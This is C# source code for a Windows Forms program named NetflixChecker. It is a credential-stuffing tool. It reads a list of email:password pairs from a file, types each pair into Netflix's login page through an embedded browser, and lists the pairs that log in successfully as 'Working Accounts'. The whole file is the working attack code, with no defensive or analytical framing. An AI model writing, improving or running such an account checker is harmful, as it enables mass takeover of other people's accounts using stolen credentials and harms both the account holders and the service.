using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NetflixChecker
{
    public partial class frmMain : Form
    {

        bool loginSuccessful = false;
        bool firstRun = true;
        string[] accounts;
        int value = 0;
        int Successful_Accounts = 0;
        int totalAccounts = 0;
        bool accountsChecked = false;
        int timerseconds = 0;

        public frmMain()
        {
            InitializeComponent();
            webNetflix.Navigate("https://www.netflix.com/Login?locale=en-AU");
        }

        public void RefreshPage()
        {
            webNetflix.Navigate("https://www.netflix.com/SignOut?Inkctr=mL");
        }

        private void webNetflix_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            if (e.Url.AbsolutePath != (sender as WebBrowser).Url.AbsolutePath)
            {
                return;
            }

            if (webNetflix.Url == new Uri("https://www.netflix.com/Login?locale=en-AU"))
            {
                if (loginSuccessful == true && firstRun == false)
                {
                    try
                    {
                        value++;
                        string[] line = accounts[value].Split(':');
                        startChecking(line[0], line[1]);
                        loginSuccessful = false;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("All accounts tested");
                        this.Controls.Add(btnCheckAccount);
                        accountsChecked = true;
                    
                    }
                }
                else if (loginSuccessful == false && firstRun == true)
                {
                    lblResult.Text = "";
                }
                else if (loginSuccessful == false && firstRun == false)
                {
                    lblResult.Text = "Login Failed!";
                    lblWorking.Text = "Working Accounts: " + Successful_Accounts.ToString() + "/" + totalAccounts.ToString();
                    value++;
                    string[] line = accounts[value].Split(':');
                    timer1.Start();
                    if(timerseconds == 3)
                    {
                        timer1.Stop();
                        startChecking(line[0], line[1]);
                    }
                }
            }
            else if (webNetflix.Url == new Uri("http://www.netflix.com/browse"))
            {
                try
                {
                    string[] line = accounts[value].Split(':');
                    txtWorkingAccounts.Text += "\n\n" + line[0] + "    " + line[1] + "\n";
                    loginSuccessful = true;
                    lblResult.Text = "Login Successful!";
                    Successful_Accounts++;
                    lblWorking.Text = "Working Accounts: " + Successful_Accounts.ToString() + "/" + totalAccounts.ToString();
                    RefreshPage();
                }
                catch (Exception ex)
                {
                    RefreshPage();
                }
            }
            else if (webNetflix.Url == new Uri("https://www.netflix.com/logout?locale=en-AU"))
            {
                lblResult.Text = "";
                webNetflix.Navigate("https://www.netflix.com/Login?locale=en-AU");
            }
        }

        public void HTMLwork(string emailValue, string passValue)
        {
            try
            {
                firstRun = false;
                HtmlDocument doc = webNetflix.Document;
                HtmlElement email = doc.GetElementById("email");
                HtmlElement pass = doc.GetElementById("password");
                HtmlElement submit = doc.GetElementById("login-form-contBtn");
                email.SetAttribute("value", emailValue);
                pass.SetAttribute("value", passValue);
                submit.InvokeMember("click");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Please wait for the page to reload back to the login screen");
            }
        }

        public void startChecking(string emailValue, string passValue)
        {
            if (firstRun == true && accountsChecked == false)
            {
                HTMLwork(emailValue, passValue);
            }
            else if (firstRun == false && accountsChecked == false)
            {
                HTMLwork(emailValue, passValue);
            }
            else if (firstRun == false && accountsChecked == true)
            {
                MessageBox.Show("These accounts have already been checked.");
            }
        }

        private void btnCheckAccount_Click(object sender, EventArgs e)
        {
            this.Controls.Remove(btnCheckAccount);
            string[] line = accounts[0].Split(':');
            startChecking(line[0], line[1]);
        }

        private void openFileWork()
        {
            OpenFileDialog ofd = new OpenFileDialog();

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                value = 0;
                accountsChecked = false;
                firstRun = true;
                string FileName = ofd.FileName;

                try
                {
                    using (StreamReader sr = new StreamReader(FileName))
                    {
                        string line = sr.ReadToEnd();
                        txtFileName.Text = FileName;
                        string[] lines = line.Split('\n');
                        accounts = lines;
                        totalAccounts = accounts.Count();
                        lblWorking.Text = "Working Accounts: " + Successful_Accounts.ToString() + "/" + totalAccounts.ToString();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString() + " Failed to read file");
                }
            }
            else
            {
                MessageBox.Show("File Open was cancelled!");
            }
        }
        
        private void btnOpen_Click(object sender, EventArgs e)
        {
            openFileWork();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timerseconds++;
        }
    }
}
